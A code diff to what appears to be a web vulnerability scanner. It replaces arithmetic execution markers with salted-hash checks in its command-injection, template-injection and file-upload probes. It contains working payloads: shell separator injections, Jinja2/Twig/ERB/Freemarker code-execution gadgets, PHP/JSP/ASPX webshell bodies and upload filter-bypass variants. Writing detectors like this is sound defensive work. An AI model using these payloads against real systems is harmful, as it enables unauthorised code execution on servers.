@@ -10,6 +10,7 @@ from __future__ import annotations
 
 import contextlib
 import gzip
+import hashlib
 import json
 import re
 import secrets
@@ -1132,11 +1133,15 @@ def no_error_state(ctx, probe) -> bool | None:
 # substitution ($(...) and backticks), and a blind time-based fallback; one finding. Precision: the
 # marker is the RESULT of a shell-evaluated arithmetic expr (13*13 -> 169) — it appears ONLY if a shell
 # ran the payload, never from reflecting the literal (which shows the "$((13*13))" text). Execution, not echo.
-_CMD_OUT = "hlci121931812224"               # 987654*123456. A POSIX shell computes this EXACTLY; an AI endpoint
-_CMD_TAIL = "echo hlci$((987654*123456))"   # that helpfully echoes arithmetic cannot (LLMs are unreliable at
-#   6x6-digit multiplication), so the exact 12-digit marker only appears from GENUINE shell execution. The old
-#   13*13 was trivial for an LLM -> false positives on AI endpoints (brightbet's /api/get-ai-opinion).
-# empty base so the host command fails FAST (`ping ;echo ...`), never hanging on a bogus host arg
+# The IN-BAND deterministic verifier: a shell HASHES a random salt exactly (`printf SALT | sha256sum`), a value
+# only GENUINE execution produces. An LLM reliably cannot hash an arbitrary string (a digest is neither memorized
+# nor reachable by generation, and the salt is fresh per run), reflection returns the payload not the digest, a
+# hashing app hashes the whole payload (not the bare salt) so its digest never matches, and a random 64-hex salt
+# rules out a coincidental hit -> no LLM / reflection / echo / hashing-app false positive. `printf` (not `echo -n`,
+# which is unreliable across shells) emits the salt with NO trailing newline so the digest we compute locally
+# matches; the salt is hex-only, carrying no % or \ for printf to reinterpret. The old arithmetic marker was
+# WRONG: a strong LLM can multiply, so a computed value can never be an execution oracle (only a hash can).
+_CMD_HASH = ("printf {s} | sha256sum", "printf {s} | md5sum")
 _CMD_SEPS = (";%s", "|%s", "||%s", "&&%s", "\n%s", "$(%s)", "`%s`")
 _CMD_TIME = (";sleep {d}", "$(sleep {d})", "`sleep {d}`", "&&sleep {d}", "|sleep {d}")
 
@@ -1176,17 +1181,20 @@ def _cmd_time_scales(c, method, action, fields, field, delay) -> bool:
 
 
 def command_injection(ctx, probe) -> bool | None:
-    """OS command injection across forms + query params + JSON API bodies. OUTPUT-based: inject
-    `<sep> echo <marker>` where the marker is a HARD 6x6-digit product; a shell computes it exactly, but an
-    AI endpoint that helpfully echoes arithmetic cannot (LLMs are unreliable at large multiplication), so the
-    exact marker only appears from GENUINE execution. BLIND fallback: a DOSE-RESPONSE sleep whose delay must
-    SCALE with the injected duration (a slow host/proxy's latency ignores the argument). Gated on endpoint
-    liveness so a catch-all / soft-404 shell cannot invent a finding. N/A when no input surface."""
+    """OS command injection across forms + query params + JSON API bodies. IN-BAND HASH oracle: inject
+    `<sep> printf <salt> | sha256sum` and look for the salt's exact digest; a shell hashes it, but nothing
+    else can (an LLM cannot hash an arbitrary string, reflection returns the payload, a hashing app hashes the
+    wrong bytes), so the digest only appears from GENUINE execution. A computed value (the old arithmetic
+    marker) can never be this oracle: a capable LLM just multiplies. BLIND fallback: a DOSE-RESPONSE sleep
+    whose delay must SCALE with the injected duration (a slow host/proxy's latency ignores the argument).
+    Gated on endpoint liveness so a catch-all / soft-404 shell cannot invent a finding. N/A when no input."""
     targets = _injectable_targets(ctx.profile) + _json_body_targets(ctx.profile)
     if not targets:
         return None
     budget = probe.probe.get("max_attempts", 120)
     delay = probe.probe.get("time_delay", 3)
+    salt = "hlci" + secrets.token_hex(6)
+    wanted = (hashlib.sha256(salt.encode()).hexdigest(), hashlib.md5(salt.encode()).hexdigest())
     tested = False
     checked = 0
     deep: list = []
@@ -1199,8 +1207,8 @@ def command_injection(ctx, probe) -> bool | None:
                 base = _xss_send(c, method, action, filler)
             except (httpx.HTTPError, httpx.InvalidURL):
                 continue
-            if _CMD_OUT in base.text:
-                continue  # marker already present -> can't attribute to the injection
+            if any(w in base.text for w in wanted):
+                continue  # digest already present (impossible for a random salt, but cheap) -> unattributable
             if _UPSTREAM_ERROR.search(base.text):
                 continue  # proxies a third-party API -> latency/output track the upstream, not a shell
             if not _endpoint_is_live(ctx, c, action, method, base):
@@ -1214,14 +1222,15 @@ def command_injection(ctx, probe) -> bool | None:
                         break
                     budget -= 1
                     tested = True
-                    data = {fn: (sep % _CMD_TAIL if fn == field else _XSS_FILLER) for fn in fields}
-                    try:
-                        if _CMD_OUT in _xss_send(c, method, action, data).text:
-                            ctx.evidence.update(injectable=True, via="separator/substitution",
-                                                target=action, field=field)
-                            return True  # a shell computed the exact 12-digit product -> real injection
-                    except (httpx.HTTPError, httpx.InvalidURL):
-                        continue
+                    for htmpl in _CMD_HASH:
+                        data = {fn: (sep % htmpl.format(s=salt) if fn == field else _XSS_FILLER) for fn in fields}
+                        try:
+                            if any(w in _xss_send(c, method, action, data).text for w in wanted):
+                                ctx.evidence.update(injectable=True, via="in-band hash",
+                                                    target=action, field=field)
+                                return True  # a shell hashed the salt to its exact digest -> real injection
+                        except (httpx.HTTPError, httpx.InvalidURL):
+                            continue
                 if len(deep) < _DEEP_SLOTS and method != "postjson":
                     # blind time-based stays OFF JSON API sinks (a slow JSON endpoint's latency variance ~= the
                     # FP failure mode); the deterministic hard-product oracle still runs on them and IS specific.
@@ -1240,25 +1249,32 @@ def command_injection(ctx, probe) -> bool | None:
 
 # Server-Side Template Injection + eval-based code injection — user input evaluated as CODE (a template
 # expression or an eval'd statement) instead of treated as data -> RCE. Comprehensive across template
-# engines AND eval sinks; one finding. Precision by the arithmetic-marker trick (as in command
-# injection): the RESULT "<marker>49" appears only if the input was EVALUATED; reflecting the literal
-# shows "<marker>{{7*7}}". The unique random marker makes a coincidental "...49" impossible.
-# 987654*123456 = 121931812224: a HARD 6x6-digit product a template engine / eval sink computes EXACTLY, but
-# an AI endpoint that helpfully echoed the trivial 7*7 -> 49 cannot (LLMs are unreliable at large
-# multiplication). The 12-digit result only appears from a real server-side evaluation, not a helpful model.
-_SSTI_EXPRS = (
-    "{{987654*123456}}", "${987654*123456}", "<%= 987654*123456 %>", "#{987654*123456}", "{987654*123456}",
-    "@(987654*123456)", "*{987654*123456}", "${{987654*123456}}",                          # template engines
-    ";echo 987654*123456;", "';echo 987654*123456;//", '";echo 987654*123456;//',
-    ";print(987654*123456)#", "<?php echo 987654*123456;?>",                                # eval code sinks
+# engines AND eval sinks; one finding. Precision by a HASH oracle (as in command injection): the salt's digest
+# appears only if the input was EXECUTED; reflecting the literal shows the payload, never the digest. A hash,
+# not the old arithmetic marker, is the only sound execution oracle against an LLM target: a computed value can
+# be produced by a capable model, but no model can hash an arbitrary salt.
+# Hash-oracle SSTI: each payload makes the engine HASH the salt via eval or an RCE gadget whose OUTPUT reflects
+# in-band (PHP/Python eval, Jinja2 popen, Twig map+system, ERB backtick, Freemarker Execute), a digest only
+# GENUINE server-side execution yields. An LLM cannot hash the salt, reflection returns the payload, and a
+# hashing app hashes the wrong bytes -> no LLM / reflection / echo FP. `{S}` is the salt placeholder (replaced,
+# not %-formatted, so the engine braces survive). BARE-ARITHMETIC template eval (no eval / RCE / hash reachable)
+# is deliberately NOT probed: a computed value is LLM-fakeable and therefore cannot be an execution oracle.
+_SSTI_HASH_TMPL = (
+    "<?php echo hash('sha256','{S}');?>", "<?php echo md5('{S}');?>",                              # PHP eval
+    ";print(__import__('hashlib').sha256(b'{S}').hexdigest())#",                                   # Python eval
+    "{{cycler.__init__.__globals__.os.popen('printf {S}|sha256sum').read()}}",                     # Jinja2 (Python)
+    "{{['printf {S}|sha256sum']|map('system')|join('')}}",                                         # Twig (PHP)
+    "<%= `printf {S}|sha256sum` %>",                                                               # ERB (Ruby)
+    '<#assign x="freemarker.template.utility.Execute"?new()>${x("printf {S}|sha256sum")}',         # Freemarker (Java)
 )
 
 
 def ssti_injectable(ctx, probe) -> bool | None:
-    """Template / eval code injection across query params and forms. Injects <marker> + 7*7 in each
-    template syntax (Jinja/Twig/Freemarker/ERB/Smarty/Razor/...) and each eval shape (PHP/Python);
-    fires when "<marker>49" reflects — the value was computed server-side. N/A when no input surface.
-    Query params are tested before forms (template/render sinks are usually GET params)."""
+    """Template / eval code injection across query params and forms. Injects a HASH oracle in each template /
+    eval shape (PHP/Python eval, Jinja2/Twig/ERB/Freemarker RCE gadget); fires when the salt's exact digest
+    reflects — a value only genuine server-side execution produces, which an LLM cannot fake (unlike the old
+    arithmetic marker, which a capable model just computes). N/A when no input surface. Query params are tested
+    before forms (template/render sinks are usually GET params)."""
     q = [(e.raw_path, "get", list(e.query_params)) for e in ctx.profile.endpoints
          if e.method.lower() == "get" and e.query_params]
     forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in ctx.profile.forms if f.fields]
@@ -1268,9 +1284,9 @@ def ssti_injectable(ctx, probe) -> bool | None:
     targets = q + forms + s + _json_body_targets(ctx.profile)   # + JSON API bodies (SPA sink)
     if not targets:
         return None
-    m = "hlssti" + secrets.token_hex(3)
-    detect = m + "121931812224"
-    payloads = [m + e for e in _SSTI_EXPRS]
+    salt = "hlssti" + secrets.token_hex(6)
+    wanted = (hashlib.sha256(salt.encode()).hexdigest(), hashlib.md5(salt.encode()).hexdigest())
+    payloads = [t.replace("{S}", salt) for t in _SSTI_HASH_TMPL]
     budget = probe.probe.get("max_attempts", 160)
     tested = False
     fields_seen = set()
@@ -1285,16 +1301,16 @@ def ssti_injectable(ctx, probe) -> bool | None:
                     fields_seen.add((action, field))
                     data = {fn: (p if fn == field else _XSS_FILLER) for fn in fields}
                     try:
-                        if detect in _xss_send(c, method, action, data).text:
-                            ctx.evidence.update(injectable=True, target=action, field=field)
-                            return True  # the exact 12-digit product was computed server-side -> injection
+                        if any(w in _xss_send(c, method, action, data).text for w in wanted):
+                            ctx.evidence.update(injectable=True, via="hash oracle", target=action, field=field)
+                            return True  # the engine hashed the salt to its exact digest -> real injection
                     except (httpx.HTTPError, httpx.InvalidURL):
                         continue
                 if budget <= 0:
                     break
             if budget <= 0:
                 break
-    ctx.evidence.update(injectable=False, fields_tested=len(fields_seen), expr_shapes=len(_SSTI_EXPRS))
+    ctx.evidence.update(injectable=False, fields_tested=len(fields_seen), expr_shapes=len(_SSTI_HASH_TMPL))
     return False if tested else None
 
 
@@ -1533,34 +1549,43 @@ def path_traversal(ctx, probe) -> bool | None:
     return False if tested else None
 
 
-# Insecure file upload — comprehensive filter-bypass coverage: a PHP webshell accepted despite
-# extension / content-type / double-extension / null-byte / magic-byte controls, then EXECUTED. The
-# payload echoes an arithmetic expression (hlup + 7*7 -> "hlup49x"); "hlup49x" in the FETCHED file
-# proves server-side execution (the stored SOURCE shows "(7*7)", never "49") -> RCE, not mere storage.
-_UPLOAD_MARK = "hlup49x"
-_UPLOAD_PHP = b"<?php echo 'hlup'.(7*7).'x'; ?>"
-# same executed-arithmetic marker in the two other server-side scripting languages a hackathon might run,
-# so the ONE RCE oracle (marker present in the fetched file) catches a Java/.NET host too, not just PHP.
-_UPLOAD_JSP = b'<% out.print("hlup"+7*7+"x"); %>'   # JSP (Java) -> hlup49x when a servlet container runs it
-_UPLOAD_ASPX = b'<%= "hlup"+(7*7)+"x" %>'           # ASP.NET (C#) -> hlup49x when the .NET runtime runs it
+# Insecure file upload — comprehensive filter-bypass coverage: a webshell accepted despite extension /
+# content-type / double-extension / null-byte / magic-byte controls, then EXECUTED. The shell HASHES a per-run
+# salt (e.g. PHP `hash('sha256', SALT)`); the salt's exact digest in the FETCHED file proves server-side
+# execution (the stored SOURCE shows the literal hash() call, never the digest) -> RCE, not mere storage. A
+# hash, not the old arithmetic 7*7, makes the oracle unfakeable and unique per run: nothing but genuine
+# execution of the uploaded code yields the digest (a preview/echo/LLM cannot compute it).
+def _upload_shells(salt: str) -> tuple[bytes, bytes, bytes]:
+    """(php, jsp, aspx) webshell bodies, each printing SHA-256(salt) hex when its runtime executes it. Built by
+    substitution (not %-formatting) so the `<% %>` and `%02x` literals survive; salt is hex, no `SALT` substring."""
+    s = salt.encode()
+    php = b"<?php echo hash('sha256','SALT');?>".replace(b"SALT", s)
+    jsp = (b'<%java.security.MessageDigest d=java.security.MessageDigest.getInstance("SHA-256");'
+           b'byte[]h=d.digest("SALT".getBytes());for(byte b:h)out.print(String.format("%02x",b));%>').replace(b"SALT", s)
+    aspx = (b'<%=System.BitConverter.ToString(System.Security.Cryptography.SHA256.Create()'
+            b'.ComputeHash(System.Text.Encoding.UTF8.GetBytes("SALT"))).Replace("-","").ToLower()%>').replace(b"SALT", s)
+    return php, jsp, aspx
+
+
 _GIF_MAGIC = b"GIF89a"                     # a real image magic header to defeat content-sniffing
 _UPLOAD_DIRS = ("", "uploads/", "upload/", "files/", "file/", "images/", "img/", "media/",
                 "hackable/uploads/", "assets/uploads/", "static/uploads/", "tmp/", "data/uploads/")
 
 
-def _upload_variants():
+def _upload_variants(salt: str):
     """(filename, content_type, body) across the standard upload-filter bypasses."""
+    php, jsp, aspx = _upload_shells(salt)
     return [
-        ("hlshell.php", "application/x-php", _UPLOAD_PHP),                # unrestricted
-        ("hlshell.php", "image/jpeg", _UPLOAD_PHP),                      # content-type spoof
-        ("hlshell.jpg.php", "image/jpeg", _UPLOAD_PHP),                  # double extension
-        ("hlshell.php.jpg", "image/jpeg", _UPLOAD_PHP),                  # trailing extension
-        ("hlshell.phtml", "image/jpeg", _UPLOAD_PHP),                    # alternate PHP extension
-        ("hlshell.php\x00.jpg", "image/jpeg", _UPLOAD_PHP),             # null-byte truncation
-        ("hlshell.php", "image/gif", _GIF_MAGIC + b"\n" + _UPLOAD_PHP),  # magic-byte spoof + PHP
-        ("hlshell.jsp", "image/jpeg", _UPLOAD_JSP),                     # Java servlet container (non-PHP RCE)
-        ("hlshell.jspx", "image/jpeg", _UPLOAD_JSP),                    # JSP XML-syntax extension
-        ("hlshell.aspx", "image/jpeg", _UPLOAD_ASPX),                  # ASP.NET (non-PHP RCE)
+        ("hlshell.php", "application/x-php", php),                # unrestricted
+        ("hlshell.php", "image/jpeg", php),                      # content-type spoof
+        ("hlshell.jpg.php", "image/jpeg", php),                  # double extension
+        ("hlshell.php.jpg", "image/jpeg", php),                  # trailing extension
+        ("hlshell.phtml", "image/jpeg", php),                    # alternate PHP extension
+        ("hlshell.php\x00.jpg", "image/jpeg", php),             # null-byte truncation
+        ("hlshell.php", "image/gif", _GIF_MAGIC + b"\n" + php),  # magic-byte spoof + PHP
+        ("hlshell.jsp", "image/jpeg", jsp),                     # Java servlet container (non-PHP RCE)
+        ("hlshell.jspx", "image/jpeg", jsp),                    # JSP XML-syntax extension
+        ("hlshell.aspx", "image/jpeg", aspx),                  # ASP.NET (non-PHP RCE)
     ]
 
 
@@ -1581,17 +1606,20 @@ NO_UPLOAD_FORM = ("no multipart form with a file field in the discovered surface
 
 
 def file_upload(ctx, probe) -> bool | None:
-    """Insecure file upload across multipart forms with a file field: upload a PHP webshell in several
-    filter-bypass shapes, locate it (from the response or common upload dirs), fetch it, and fire when
-    it EXECUTES (arithmetic marker). N/A when there's no file-upload form."""
+    """Insecure file upload across multipart forms with a file field: upload a webshell in several filter-bypass
+    shapes, locate it (from the response or common upload dirs), fetch it, and fire when it EXECUTES (the salt's
+    exact hash digest appears). N/A when there's no file-upload form."""
     forms = [f for f in ctx.profile.forms if f.file_fields]
     if not forms:
         ctx.evidence["na_reason"] = (NO_UPLOAD_FORM % len(ctx.profile.forms or []))
         return None
+    salt = "hlup" + secrets.token_hex(6)
+    want = hashlib.sha256(salt.encode()).hexdigest()   # only genuine execution of the uploaded code yields this
+    variants = _upload_variants(salt)
     tested = False
     with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
         for f in forms:
-            for filename, ctype, body in _upload_variants():
+            for filename, ctype, body in variants:
                 tested = True
                 files = {ff: (filename, body, ctype) for ff in f.file_fields}
                 data = {fn: _XSS_FILLER for fn in f.fields if fn not in f.file_fields}
@@ -1602,13 +1630,13 @@ def file_upload(ctx, probe) -> bool | None:
                 for url in _locate_upload(resp.text, filename):
                     try:
                         got = c.get(url)
-                        if _UPLOAD_MARK in got.text:
+                        if want in got.text:
                             ctx.evidence.update(rce=True, form=f.action, filename=filename,
-                                                repro=_repro_from_resp(got, matched="uploaded script executed server-side (marker returned)"))
-                            return True  # the uploaded webshell executed server-side -> RCE via upload
+                                                repro=_repro_from_resp(got, matched="uploaded script executed server-side (salt digest returned)"))
+                            return True  # the uploaded webshell hashed the salt server-side -> RCE via upload
                     except (httpx.HTTPError, httpx.InvalidURL):
                         continue
-    ctx.evidence.update(rce=False, forms=len(forms), variants=len(_upload_variants()))
+    ctx.evidence.update(rce=False, forms=len(forms), variants=len(variants))
     return False if tested else None
 
 
@@ -1619,7 +1647,7 @@ def file_upload(ctx, probe) -> bool | None:
 # Content-Type + Content-Disposition. Intent-independent: serving user active content in-origin is wrong
 # regardless of the app's purpose. Distinct vector from reflected xss_injectable (upload-persisted, hits
 # every viewer, no reflection needed) -> its own finding.
-_UPLOAD_XSS_MARK = "hlupxss49"   # unique token our uploaded active content carries (distinct from _UPLOAD_MARK)
+_UPLOAD_XSS_MARK = "hlupxss49"   # unique token our uploaded active content carries (distinct from the RCE salt)
 _UPLOAD_XSS_HTML = ('<!doctype html><html><body><script>window.name="%s"</script>%s</body></html>'
                     % (_UPLOAD_XSS_MARK, _UPLOAD_XSS_MARK)).encode()
 _UPLOAD_XSS_SVG = ('<svg xmlns="http://www.w3.org/2000/svg"><script>window.name="%s"</script>'
